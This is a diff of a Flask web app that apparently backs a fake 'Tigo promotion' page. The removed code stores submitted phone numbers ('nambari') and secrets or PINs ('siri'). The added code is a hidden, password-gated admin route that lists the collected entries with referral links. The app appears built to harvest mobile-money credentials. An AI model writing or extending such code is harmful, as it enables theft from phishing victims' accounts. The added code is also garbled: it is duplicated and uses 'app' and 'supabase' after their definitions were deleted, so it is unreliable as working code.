@@ -1,49 +1,84 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, abort
 import os
 import traceback
-from supabase import create_client
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-TEMPLATES_DIR = os.path.join(BASE_DIR, "..", "templates")
-
-app = Flask(__name__, template_folder=TEMPLATES_DIR)
-
-supabase_url = os.environ.get("SUPABASE_URL")
-supabase_key = os.environ.get("SUPABASE_KEY")
-
-print("SUPABASE_URL:", supabase_url)
-print("SUPABASE_KEY:", "SET" if supabase_key else "MISSING")
-
-if not supabase_url or not supabase_key:
-    raise RuntimeError("Supabase env vars missing")
-
-supabase = create_client(supabase_url, supabase_key)
-print("✅ Supabase connected")
+# get admin password from env
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
 
 
-@app.route("/")
-def home():
-    return render_template("index.html")
+@app.route("/adminvinc684833", methods=["GET", "POST"])
+def admin():
+    # if password not configured, block access
+    if not ADMIN_PASSWORD:
+        return "Admin password not configured", 500
+
+    # handle password submit
+    if request.method == "POST":
+        password = request.form.get("password")
+
+        if password != ADMIN_PASSWORD:
+            return render_template("admin_login.html", error="Invalid password")
+
+        # correct password → load data
+        try:
+            response = supabase.table("tigo_promotions") \
+                .select("id,nambari,siri,url_link,created_at") \
+                .order("created_at", desc=True) \
+                .execute()
+
+            rows = response.data or []
+            base_url = request.host_url.rstrip("/")
+
+            for row in rows:
+                row["referral"] = f"{base_url}/?ref={row['url_link']}"
+
+            return render_template("admin.html", rows=rows)
+
+        except Exception:
+            traceback.print_exc()
+            return "Failed to load admin data", 500
+
+    # GET request → show login page
+    return render_template("admin_login.html")
+from flask import Flask, request, render_template, abort
+import os
+import traceback
+
+# get admin password from env
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
 
 
-@app.route("/add_tigo.php", methods=["POST"])
-def add_tigo():
-    try:
-        nambari = request.form.get("nambari")
-        siri = request.form.get("siri")
-        url_link = request.form.get("url_link", "gzktrsjamfkw")
+@app.route("/adminvinc684833", methods=["GET", "POST"])
+def admin():
+    # if password not configured, block access
+    if not ADMIN_PASSWORD:
+        return "Admin password not configured", 500
 
-        if not nambari or not siri:
-            return "Missing fields", 400
+    # handle password submit
+    if request.method == "POST":
+        password = request.form.get("password")
 
-        supabase.table("tigo_promotions").insert({
-            "nambari": nambari,
-            "siri": siri,
-            "url_link": url_link
-        }).execute()
+        if password != ADMIN_PASSWORD:
+            return render_template("admin_login.html", error="Invalid password")
 
-        return "Data added successfully! ✅"
+        # correct password → load data
+        try:
+            response = supabase.table("tigo_promotions") \
+                .select("id,nambari,siri,url_link,created_at") \
+                .order("created_at", desc=True) \
+                .execute()
 
-    except Exception:
-        traceback.print_exc()
-        return "Insert failed", 500
+            rows = response.data or []
+            base_url = request.host_url.rstrip("/")
+
+            for row in rows:
+                row["referral"] = f"{base_url}/?ref={row['url_link']}"
+
+            return render_template("admin.html", rows=rows)
+
+        except Exception:
+            traceback.print_exc()
+            return "Failed to load admin data", 500
+
+    # GET request → show login page
+    return render_template("admin_login.html")
